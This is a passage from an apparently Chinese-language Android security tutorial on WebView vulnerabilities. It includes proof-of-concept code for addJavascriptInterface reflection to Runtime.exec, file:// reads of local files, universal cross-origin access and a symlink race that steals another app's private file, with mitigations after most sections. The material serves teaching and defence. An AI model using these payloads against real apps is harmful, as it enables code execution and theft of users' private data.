<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">callJS</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;Android调用了JS的callJS方法&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Android调用JS方法测试<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后在Java层中添加代码，进行调用JS文件以及JS中的方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置与Js交互的权限</span></span><br><span class="line"> webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> <span class="comment">// 设置允许JS弹窗</span></span><br><span class="line"> webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 先载入JS代码</span></span><br><span class="line"> <span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line"> mWebView.loadUrl(<span class="string">&quot;file:///android_asset/AndroJs.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line"> button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">         <span class="comment">// 通过Handler发送消息</span></span><br><span class="line">         mWebView.post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"> </span><br><span class="line">                 <span class="comment">// 注意调用的JS方法名要对应上</span></span><br><span class="line">                 <span class="comment">// 调用javascript的callJS()方法</span></span><br><span class="line">                 mWebView.loadUrl(<span class="string">&quot;javascript:callJS()&quot;</span>);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line"> </span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 由于设置了弹窗检验调用结果,所以需要支持js对话框</span></span><br><span class="line"> <span class="comment">// webview只是载体，内容的渲染需要使用webviewChromClient类去实现</span></span><br><span class="line"> <span class="comment">// 通过设置WebChromeClient对象处理JavaScript的对话框</span></span><br><span class="line"> <span class="comment">//设置响应js 的Alert()函数</span></span><br><span class="line"> mWebView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsAlert</span><span class="params">(WebView view, String url, String message, <span class="keyword">final</span> JsResult result)</span> &#123;</span><br><span class="line">         AlertDialog.<span class="type">Builder</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(MainActivity.<span class="built_in">this</span>);</span><br><span class="line">         b.setTitle(<span class="string">&quot;Alert&quot;</span>);</span><br><span class="line">         b.setMessage(message);</span><br><span class="line">         b.setPositiveButton(android.R.string.ok, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog, <span class="type">int</span> which)</span> &#123;</span><br><span class="line">                 result.confirm();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">         b.setCancelable(<span class="literal">false</span>);</span><br><span class="line">         b.create().show();</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure>
<p><strong>特别注意：JS代码调用一定要在 <code>onPageFinished（）</code> 回调之后才能调用，否则不会调用</strong></p>
<p>onPageFinished()属于WebViewClient类的方法，主要在页面加载结束时调用</p>
<p>还可以使用**WebView.evaluateJavascript()**调用js代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用evaluateJavascript来加载</span></span><br><span class="line">mWebView.evaluateJavascript(<span class="string">&quot;javascript:callJS()&quot;</span>, <span class="keyword">new</span> <span class="title class_">ValueCallback</span>&lt;String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceiveValue</span><span class="params">(String value)</span> &#123;</span><br><span class="line">        <span class="comment">//此处为 js 返回的结果</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="Webview漏洞-2">Webview漏洞</h3>
<h4 id="漏洞类型概括">漏洞类型概括</h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bbs.kanxue.com/upload/attach/202207/905443_E25ZWREXH5JZHN2.png" alt="image-20220729145936266"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_C8YTUCX4746WZHB-17271001469662.png" alt="image-20220729152654652"></p>
<h4 id="历史漏洞">历史漏洞</h4>
<h5 id="Webview任意代码执行漏洞">Webview任意代码执行漏洞</h5>
<p><strong>addJavascriptInterface接口引起远程代码执行漏洞</strong></p>
<p><strong>漏洞原理</strong></p>
<p>JS和Android的直接通信可以通过addJavascriptInterface接口进行对象映射</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webView.addJavascriptInterface(<span class="keyword">new</span> JSObject(), <span class="string">&quot;myObj&quot;</span>);</span><br><span class="line"><span class="comment">// 参数1：Android的本地对象</span></span><br><span class="line"><span class="comment">// 参数2：JS的对象</span></span><br><span class="line"><span class="comment">// 通过对象映射将Android中的本地对象和JS中的对象进行关联，从而实现JS调用Android的对象和方法</span></span><br></pre></td></tr></table></figure>
<p>当JS拿到Android这个对象后，就可以调用这个Android对象中所有的方法，包括系统类（java.lang.Runtime 类），从而进行任意代码执行。</p>
<p>具体的攻击步骤：</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）Android中的对象有一公共的方法：getClass()</span><br><span class="line">（<span class="number">2</span>）该方法可以获取到当前类 类型<span class="keyword">Class</span></span><br><span class="line">（<span class="number">3</span>）该类有一关键的方法： <span class="keyword">Class</span>.forName；</span><br><span class="line">（<span class="number">4</span>）该方法可以加载一个类（可加载 java.lang.<span class="keyword">Runtime</span> 类）</span><br><span class="line">（<span class="number">5</span>）而该类是可以执行本地命令的</span><br></pre></td></tr></table></figure>
<p><strong>示例代码</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">execute</span><span class="params">(cmdArgs)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">// 步骤1：遍历 window 对象</span></span><br><span class="line">    <span class="comment">// 目的是为了找到包含 getClass （）的对象</span></span><br><span class="line">    <span class="comment">// 因为Android映射的JS对象也在window中，所以肯定会遍历到</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> obj in window) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> in window[obj]) &#123; </span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 步骤2：利用反射调用forName（）得到Runtime类对象</span></span><br><span class="line">            alert(obj);         </span><br><span class="line">            <span class="keyword">return</span>  window[obj].getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>) </span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 步骤3：以后，就可以调用静态方法来执行一些命令，比如访问文件的命令</span></span><br><span class="line">getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmdArgs); </span><br><span class="line"> </span><br><span class="line"><span class="comment">// 从执行命令后返回的输入流中得到字符串，有很严重暴露隐私的危险。</span></span><br><span class="line"><span class="comment">// 如执行完访问文件的命令之后，就可以得到文件名的信息了。</span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>漏洞防护</strong></p>
<p>Google在Android4.2以后对调用的函数以<code>@JavascriptInterface</code>进行注解从而避免漏洞攻击，也就是说我们js调用Android的方法，必须要在JavascriptInterface中进行声明，这样才能调用。</p>
<h5 id="webview明文存储漏洞">webview明文存储漏洞</h5>
<p>WebView默认开启密码保存功能 ：</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mWebView.setSavePassword(<span class="literal">true</span>)`</span><br></pre></td></tr></table></figure>
<p>开启后，在用户输入密码时，会弹出提示框：询问用户是否保存密码；</p>
<p>如果选择”是”，密码会被明文保到 <code>/data/data/com.package.name/databases/webview.db</code> 中，这样就有被盗取密码的危险</p>
<p><strong>安全防护：</strong></p>
<p>通过 WebSettings.setSavePassword(false) 关闭密码保存提醒功能，防止明文密码存在本地被盗用。</p>
<h4 id="跨域漏洞"><strong>跨域漏洞</strong></h4>
<p>WebView开启了file域访问，且允许file域对http域进行访问，同时未对file域的路径进行严格限制所致，攻击者通过URL Scheme的方式，可远程打开并加载恶意HTML文件，远程获取app中包括用户登录凭证在内的所有本地敏感数据。</p>
<p>针对这个漏洞，涉及如下几个api函数：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240930170405744.png" alt="image-20240930170405744"></p>
<h5 id="任意文件窃取-应用克隆漏洞">任意文件窃取(应用克隆漏洞)</h5>
<p><strong>漏洞原理</strong></p>
<p>setAllowFileAccess(true) + setAllowFileAccessFromFileURLs(true)</p>
<p>这样使得WebView可以使用File协议和加载js代码读取本地文件，这样会导致攻击者操作用户点击后无感知下载恶意的HTML/JS，并窃取相关的私有文件信息。</p>
<p><strong>漏洞复现</strong></p>
<p>我们可以查询Android手机中的<code>/etc/hosts</code>私有文件信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_D6RRGQX47ZWBV4B.png" alt="image-20220729195648955"></p>
<p>编写一个js文件来读取本地文件：<strong>fileAttack.html</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> arm = <span class="string">&quot;file:///etc/hosts&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)  <span class="comment">//当XMLHttpRequest发生变化时 触发回调</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)          <span class="comment">//请求是否完成     </span></span><br><span class="line">        &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">loadXMLDoc</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>我们将这个文件上传至手机 /data/local/tmp下</p>
<p>编写攻击代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setContentView(R.layout.activity_file_web_view);</span><br><span class="line">      <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webview0);</span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 File 协议</span></span><br><span class="line">      webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 JavaScript</span></span><br><span class="line">      webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> 	  webView.getSettings().setAllowFileAccessFromFileURLs(<span class="literal">true</span>);</span><br><span class="line">      </span><br><span class="line">      webView.loadUrl(<span class="string">&quot;file:///data/local/tmp/fileAttack.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>这里就获取了相应的私有文件信息，而且加载了我们的恶意html文件</p>
<h5 id="通用协议漏洞-恶意页面注入">通用协议漏洞(恶意页面注入)</h5>
<p>setAllowFileAccess(true) + setAllowUniversalAccessFromFileURLs(true)</p>
<p>用同样的方式测试 setAllowUniversalAccessFromFileURLs 的值，当 setAllowUniversalAccessFromFileURLs 的值为 true 时，可以利用 js 来访问恶意网站（HTTP 或 HTTPS）的链接</p>
<p>我们将上面html中的访问改为看雪的网站：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> arm = <span class="string">&quot;https://bbs.pediy.com/&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">loadXMLDoc</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>然后开启setAllowUniversalAccessFromFileURLs 函数API,并运行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setContentView(R.layout.activity_file_web_view);</span><br><span class="line">      <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webview0);</span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 File 协议</span></span><br><span class="line">      webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">      <span class="comment">//设置是否允许 WebView 使用 JavaScript</span></span><br><span class="line">      webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> 	  webView.getSettings().setAllowUniversalAccessFromFileURLs(<span class="literal">true</span>);</span><br><span class="line">      </span><br><span class="line">      webView.loadUrl(<span class="string">&quot;file:///data/local/tmp/fileAttack.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>我们可以发现这里我们注入html后还可以去访问网站，这样我们可以在脚本中使其访问恶意的网站界面，并返回这样就可以进行恶意界面的注入</p>
<h5 id="安全防护-2"><strong>安全防护</strong></h5>
<ul>
<li>检查应用是否使用了webview控件</li>
<li>避免app内部的webview被不信任的第三方调用，排查内置webview的activity是否被导出，必须导出的activity是否会通过参数传递调起内置的webview</li>
<li>file域访问为非必要功能需求时，手动配置 setAllowFileAccessFromFileURLs 或 setAllowUniversalAccessFromFileURLs 两个 API 为 false（Android 4.1 版本之前这两个 API 默认是 true，需要显式设置为 false）；</li>
</ul>
<p>若要开启file域访问，则设置file路径的白名单，严格控制file域访问范围，具体如下</p>
<ul>
<li>固定不变的 HTML 文件可以放在 assets 或 res 目录下，file:///android_asset 和 file:///android_res 在不开启 API 的情况下也可以访问；</li>
<li>可能会更新的 HTML 文件放在 /data/data/(app) 目录下，避免被第三方替换或修改；</li>
<li>对 file 域请求做白名单限制时，需要对“…/…/”特殊情况进行处理，避免白名单被绕过。</li>
</ul>
<h5 id="符号链接跨源攻击">符号链接跨源攻击</h5>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35993502/article/details/121371049">Android安全检测－WebView File域同源策略绕过漏洞</a></p>
<p>这类漏洞，只有<strong>setAllowFileAccess为True</strong></p>
<p><strong>漏洞原理</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_NW7GHWBMGDNE5TU.png" alt="image-20220729202532795"></p>
<p>攻击过程：首先是操控webview去访问攻击app自己公开的一个网页，然后这个网页执行的内容其实是延时去读取自身，在延时读取自身的时间窗口内，这个文件悄悄被进行了替换，替换成了软连接，指向受害者app的一个私有文件，最终读取窃取内容</p>
<p>构造HTML文件</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#恶意APP的HTML,被检测APP加载此html，执行JS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">var d = document;</span><br><span class="line">function loadDatabase()</span><br><span class="line">&#123;</span><br><span class="line">    var file_url = d.URL;</span><br><span class="line">    var xmlhttp =new XMLHttpRequest();</span><br><span class="line">    xmlhttp.onload=function() &#123;    //回调函数 当请求完成时执行</span><br><span class="line">         document.body.appendChild(d.createTextNode(xmlhttp.responseText))</span><br><span class="line">        alert(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.open(&quot;GET&quot;,file_url);</span><br><span class="line">    xmlhttp.send(null);</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(loadDatabase(),8000); #延迟8秒执行。利用时间差和软链接来获取被攻击APP的私有文件</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造恶意app的攻击代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#恶意APP的攻击代码</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">HTML</span> <span class="operator">=</span> <span class="string">&quot;恶意APP的HTML,在上面的HTML代码&quot;</span>;</span><br><span class="line">          #新建文件夹，用于存放恶意HTML文件</span><br><span class="line">           cmdexec(<span class="string">&quot;mkdir /data/data/mm.xxxxx.testdemo3/files&quot;</span>);</span><br><span class="line">           #将恶意HTML到恶意APP的沙盒目录</span><br><span class="line">        cmdexec(<span class="string">&quot;echo \&quot;&quot;</span> + HTML + <span class="string">&quot;\&quot; &gt;  /data/data/mm.xxxxx.testdemo3/files/attack.html&quot;</span>);</span><br><span class="line">        #授权目录及其文件权限，允许其它应用访问</span><br><span class="line">        cmdexec(<span class="string">&quot;chmod -R 777 /data/data/mm.xxxxx.testdemo3/files&quot;</span>);</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        #启动被攻击的APP，并携带恶意HTML</span><br><span class="line">        <span class="title function_">invokeVulnAPP</span><span class="params">(<span class="string">&quot;file://&quot;</span> + HTML_PATH)</span>;</span><br><span class="line">        #延时<span class="number">6</span>秒</span><br><span class="line">        Thread.sleep(<span class="number">6000</span>);</span><br><span class="line">        #删除HTML文件</span><br><span class="line">        cmdexec(<span class="string">&quot;rm &quot;</span> + HTML_PATH);</span><br><span class="line">        #软链接文件，实现读取被攻击应用的<span class="keyword">private</span>.txt文件</span><br><span class="line">        cmdexec(<span class="string">&quot;ln -s &quot;</span> + <span class="string">&quot;/data/data/mm.xxxxx.testdemo3/files/private.txt&quot;</span> + <span class="string">&quot; &quot;</span> + HTML_PATH);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>目标样本：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#被攻击的APP，有漏洞的代码</span><br><span class="line"><span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.webview);</span><br><span class="line">webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);  允许加载File域</span><br><span class="line"> </span><br><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="keyword">if</span> (i != <span class="literal">null</span>) &#123;</span><br><span class="line">     mUri = i.getData(); #取出了恶意HTML</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (mUri != <span class="literal">null</span>) &#123;</span><br><span class="line">    url = mUri.toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (url != <span class="literal">null</span>) &#123;</span><br><span class="line">    webView.loadUrl(url); #加载了恶意HTML</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="安全防护-3">安全防护</h6>
